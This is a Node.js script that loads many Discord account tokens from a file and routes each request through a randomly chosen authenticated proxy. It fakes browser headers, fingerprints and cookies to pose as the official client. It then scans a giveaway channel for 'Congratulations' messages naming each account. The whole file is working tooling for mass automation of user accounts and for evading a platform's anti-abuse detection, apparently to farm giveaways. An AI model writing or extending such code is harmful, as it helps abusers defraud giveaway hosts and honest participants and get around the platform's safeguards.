const axios = require("axios").default; //req lib
const arrayChunks = require('array-splitter-chunks'); //sub array
const { AsyncLocalStorage } = require("async_hooks");
const { realpathSync } = require("fs");
const fs = require('fs.promises'); //to read files
let httpsProxyAgent = require('https-proxy-agent'); //for proxies

//will pull data from input/config{
let delay = 500; // delay
let threads = 1; // amount of threads
let messagelink = 'https://discord.com/channels/986025451430481941/987978545701716018/988195822543994900' //messages to verify
//}
// varibles used tru out the script{
let fingerprint;
let wins = []
let cookie;
let data
let count = 0
let guild_id = messagelink.split('/')[4]
let channel_id = messagelink.split('/')[5]
let message_id = messagelink.split('/')[6]
//}
function gettime(){
var date = new Date(new Date().toLocaleString('en-US'));
var hr = date.getHours() + '';
var min = date.getMinutes() + '';
var sec = date.getSeconds() + '';



if (hr.length == 1) {
    hr = '0' + hr;
}

if (min.length == 1) {
    min = '0' + min;
}

if (sec.length == 1) {
    sec = '0' + sec;
}
let time = `[${hr}:${min}:${sec}]`
return time
}

function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
        currentDate = Date.now();
    } while (currentDate - date < milliseconds);
}

async function tasks() {
    //gets tokens and splits them in an array then sub arrays
    const fileName = 'tokens.txt';
    token = await fs.readFile(fileName, 'utf8');
    token = token.split('\n')
    tokens = []
    token.forEach(element => {
        if (element.length > 1) {
            tokens.push(element.trim())
        }
    });
    token = tokens
    let num = Math.floor(token.length / threads)
    arrayChunks(token, num, function(err, chunks) {
        console.log('\x1b[36mStarting Task...')
        console.log('\x1b[36mAtempting To Connect To Proxy...')
        let i = 0
        while (i < chunks.length) {
            let tokenlist = chunks[i]
            startjoin(tokenlist)
            i++
        }
    });
}


async function startjoin(tokenlist) {
    //takes list and splits it and sends in value
    let i = 0
    while (i < tokenlist.length) {
        token = tokenlist[i]
        await getfingerprint()
        await cookies()
        await join(token)
        await sleep(delay)
        i++
    }
}
async function get_proxy() {
    //This func gets a proxy and splits it to what is needed
    try {
        let data = await fs.readFile("modules/proxies.txt", "utf-8");
        let proxies = data.split("\n").map(line => line.trim());
        let proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");
        return {
            host: proxy[0],
            port: proxy[1],
            user: proxy[2],
            pass: proxy[3],
            proxyurl: `http://${proxy[2]}:${proxy[3]}@${proxy[0]}:${proxy[1]}`
        }
    } catch (err) {
        throw err;
    }
}



async function getfingerprint() {
    //request to discord to get a valid fingerprint
    let print = await (await axios.get("https://canary.discord.com/api/v10/experiments")).data.fingerprint;
    fingerprint = print;
}




async function cookies() {
    //Gets disord Cookie then formats 
    let proxy = await get_proxy() //grabs proxy
    var agent = new httpsProxyAgent(proxy.proxyurl); //assigns proxy

    var config = {
        url: 'https://discord.com',
        httpsAgent: agent
    }

    await axios(config)
        .then(function(response) {
            cookie = `${response.headers["set-cookie"][0].split(";")[0]}; ${
                response.headers["set-cookie"][1].split(";")[0]
            }; locale=us`;
        })
        .catch(function(error) {
            console.log("\x1b[31mFailed Getting Cookies");
        });

}


async function join(token) {
     let proxy = await get_proxy() //grabs proxy
     var agent = new httpsProxyAgent(proxy.proxyurl); //assigns proxy
    const config = {
        method: "get",
         httpsAgent: agent, //proxy here
        url: `https://discord.com/api/v9/channels/987978545701716018/messages?limit=50`,
        headers: {
            authority: 'discord.com',
            path: '/api/v9/channels/987978545701716018/messages?limit=50',
            scheme: 'https',
            accept: '*/*',
            referer: 'https://discord.com/channels/986025451430481941/987978545701716018',
            'sec-ch-ua-platform': "Windows",
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEzMjgzMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
            Authorization: token,
            "X-Fingerprint": fingerprint,
            cookie: cookie,
        },
    }
    await axios(config).then(async function(response) {
           let i = 0
           while(i<response.data.length){
            if(response.data[i].id == message_id){
                num = Math.floor(response.data.length - i)
                num = Math.floor(response.data.length - num)
                let id = await getuser()
                id = id.split(':')
                let messages =  await getnew(num)
                let q = 0
                while(q<messages.length){
                    if(messages[q].content.includes('Congratulations')){
                        if(messages[q].content.includes(id[0])){
                            wins.push(id[1])
                            console.log(wins)
                        }
                    }
                    q++
                }
                return
            }else{
            i++
           }
        }
        })
        .catch(async function(error) {
            console.log(error)
        })
}

async function getuser(){
    let proxy = await get_proxy() //grabs proxy
     var agent = new httpsProxyAgent(proxy.proxyurl); //assigns proxy
    const config = {
        method: "get",
         httpsAgent: agent, //proxy here
        url: `https://discordapp.com/api/v9/users/@me`,
        headers: {
            authority: 'discord.com',
            path: '/api/v9/channels/987978545701716018/messages?limit=50',
            scheme: 'https',
            accept: '*/*',
            referer: 'https://discord.com/channels/986025451430481941/987978545701716018',
            'sec-ch-ua-platform': "Windows",
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEzMjgzMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
            Authorization: token,
            "X-Fingerprint": fingerprint,
            cookie: cookie,
        },
    }
    let id = await axios(config).then(async function(response) {
        return `${response.data.id}:${response.data.username+'#'+response.data.discriminator}`
    });
    return id
}

async function getnew(num){
    let proxy = await get_proxy() //grabs proxy
     var agent = new httpsProxyAgent(proxy.proxyurl); //assigns proxy
    const config = {
        method: "get",
         httpsAgent: agent, //proxy here
        url: `https://discord.com/api/v9/channels/987978545701716018/messages?limit=${num}`,
        headers: {
            authority: 'discord.com',
            path: '/api/v9/channels/987978545701716018/messages?limit=50',
            scheme: 'https',
            accept: '*/*',
            referer: 'https://discord.com/channels/986025451430481941/987978545701716018',
            'sec-ch-ua-platform': "Windows",
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEzMjgzMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
            Authorization: token,
            "X-Fingerprint": fingerprint,
            cookie: cookie,
        },
    }
   let responses =  await axios(config).then(async function(response) {
        return response.data
    });
    return responses
}
tasks()